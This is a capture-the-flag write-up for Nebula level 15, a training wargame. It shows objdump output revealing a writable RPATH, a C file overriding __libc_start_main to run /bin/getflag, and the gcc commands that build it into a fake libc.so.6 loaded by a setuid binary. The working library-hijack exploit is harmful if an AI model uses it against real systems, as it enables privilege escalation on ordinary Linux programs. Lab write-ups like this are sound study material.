# Level15

#### About

strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth. 
Clean up after yourself :) 

To do this level, log in as the level15 account with the password level15. Files for this level can be found in /home/flag15. 


#### Source code

There is no source code available for this level


#### Soltions

```
level15@nebula:~$ objdump -p /home/flag15/flag15

/home/flag15/flag15:     file format elf32-i386

Program Header:
    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2
         filesz 0x00000120 memsz 0x00000120 flags r-x
  INTERP off    0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
         filesz 0x000005d4 memsz 0x000005d4 flags r-x
    LOAD off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**12
         filesz 0x00000108 memsz 0x00000110 flags rw-
 DYNAMIC off    0x00000f20 vaddr 0x08049f20 paddr 0x08049f20 align 2**2
         filesz 0x000000d0 memsz 0x000000d0 flags rw-
    NOTE off    0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
EH_FRAME off    0x000004dc vaddr 0x080484dc paddr 0x080484dc align 2**2
         filesz 0x00000034 memsz 0x00000034 flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
         filesz 0x00000000 memsz 0x00000000 flags rw-
   RELRO off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**0
         filesz 0x000000f4 memsz 0x000000f4 flags r--

Dynamic Section:
  NEEDED               libc.so.6
  RPATH                /var/tmp/flag15
  INIT                 0x080482c0
  FINI                 0x080484ac
  GNU_HASH             0x080481ac
  STRTAB               0x0804821c
  SYMTAB               0x080481cc
  STRSZ                0x0000005a
  SYMENT               0x00000010
  DEBUG                0x00000000
  PLTGOT               0x08049ff4
  PLTRELSZ             0x00000018
  PLTREL               0x00000011
  JMPREL               0x080482a8
  REL                  0x080482a0
  RELSZ                0x00000008
  RELENT               0x00000008
  VERNEED              0x08048280
  VERNEEDNUM           0x00000001
  VERSYM               0x08048276

Version References:
  required from libc.so.6:
    0x0d696910 0x00 02 GLIBC_2.0

level15@nebula:/var/tmp/flag15$ cat exploit.c 
#include <unistd.h>
int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    execl("/bin/getflag", (char *)NULL, (char *)NULL);
}
level15@nebula:/var/tmp/flag15$  gcc -fPIC -g -c exploit.c 
level15@nebula:/var/tmp/flag15$ ls -l
total 8
-rw-rw-r-- 1 level15 level15  255 2014-11-22 08:11 exploit.c
-rw-rw-r-- 1 level15 level15 2956 2014-11-22 08:11 exploit.o
level15@nebula:/var/tmp/flag15$ gcc exploit.o -shared -o libc.so.6
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
level15@nebula:/var/tmp/flag15$ gcc -fPIC -g -c exploit.c
level15@nebula:/var/tmp/flag15$ gcc -shared -Wl,--version-script,verscript -o libc.so.6 exploit.o 
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3' not found (required by /var/tmp/flag15/libc.so.6)
level15@nebula:/var/tmp/flag15$ gcc -shared -Wl,--version-script,verscript,-Bstatic -static-libgcc -o libc.so.6 exploit.o
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
You have successfully executed getflag on a target account

level15@nebula:/var/tmp/flag15$ cat exploit.c
#include <unistd.h>
int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    // execl("/bin/getflag", (char *)NULL, (char *)NULL);
    system("/bin/getflag");
}

level15@nebula:/var/tmp/flag15$ gcc -fPIC -g -c exploit.c 
level15@nebula:/var/tmp/flag15$ gcc -shared -Wl,--version-script,verscript,-Bstatic -static-libgcc -o libc.so.6 exploit.o
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
You have successfully executed getflag on a target account
Segmentation fault ++++++++ Attention Here !!!
```

#### Recommend

http://www.kroosec.com/2012/11/nebula-level15.html 
http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html 
